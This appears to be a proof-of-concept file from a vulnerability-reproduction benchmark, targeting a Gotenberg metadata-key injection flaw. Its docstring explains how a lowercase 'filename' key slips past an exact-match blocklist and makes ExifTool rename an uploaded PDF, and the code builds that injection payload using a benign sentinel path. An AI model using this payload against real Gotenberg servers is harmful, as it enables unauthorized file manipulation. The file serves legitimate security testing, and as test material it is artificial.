#!/usr/bin/env python3
r"""Original vulnerability PoC for gotenberg-cve-2026-40281.

ORIGINAL CVE = CVE-2026-42589 (GHSA-rqgh-gxv4-6657):
  "Gotenberg has Unauthenticated RCE via ExifTool Metadata Key Injection."

Mechanism (metadata-KEY pseudo-tag injection): the unauthenticated endpoint
POST /forms/pdfengines/metadata/write passes user-supplied metadata straight
to go-exiftool, which writes each pair as `-<key>=<value>` on ExifTool's
line-based stdin. ExifTool honours dangerous *pseudo-tags* (FileName, Directory,
SymLink, HardLink) that perform filesystem side effects. In v8.29.1
(pkg/modules/exiftool/exiftool.go) the only guard is an EXACT, case-SENSITIVE
blocklist:

    dangerousTags := []string{"FileName", "Directory"}
    for _, tag := range dangerousTags { delete(metadata, tag) }   // exact key only

So a case-variant key such as {"filename": "..."} slips past the blocklist,
and ExifTool (which treats tag names case-insensitively) executes the
`-filename=` pseudo-tag => the input PDF is RENAMED to an attacker-chosen path.

The v8.30.1 fix (commit 405f106) hardened this KEY blocklist to a
case-insensitive match and added SymLink/HardLink:

    for key := range metadata {
        for _, tag := range dangerousTags {   // now FileName/Directory/HardLink/SymLink
            if strings.EqualFold(key, tag) { delete(metadata, key) }
        }
    }

=> the case-variant key injection is blocked at v8.30.1 (TARGET). But that fix
only ever inspected the metadata KEY, leaving metadata VALUES unsanitized ->
the residual CVE-2026-40281 (see _heldout/bypass_poc.py).

BENIGN CANARY: the injected pseudo-tag is `-FileName=<sentinel>`, which merely
renames the just-uploaded temp PDF to a per-run sentinel path. No `-if`, no
`-exec`, no shell, no real RCE -- the observable is purely a benign filesystem
state-write, and the moved file is the original %PDF payload.
"""
from __future__ import annotations

import json


def sentinel_path(flag: str) -> str:
    """Per-run sentinel the original (KEY) injection renames the PDF to."""
    return f"/tmp/pcb_key_{flag}"


def candidate(flag: str) -> dict:
    """Return the multipart 'metadata' field (JSON string) + expected sentinel.

    metadata = {"filename": "/tmp/pcb_key_<flag>"}
      - v8.29.1 (V0): "filename" != "FileName" -> survives exact-match blocklist
                      -> ExifTool renames PDF to the sentinel  (INJECTS)
      - v8.30.1 (V1): strings.EqualFold("filename","FileName") -> deleted (BLOCKED)
    """
    path = sentinel_path(flag)
    metadata = json.dumps({"filename": path})
    return {"kind": "key", "metadata": metadata, "sentinel": path}
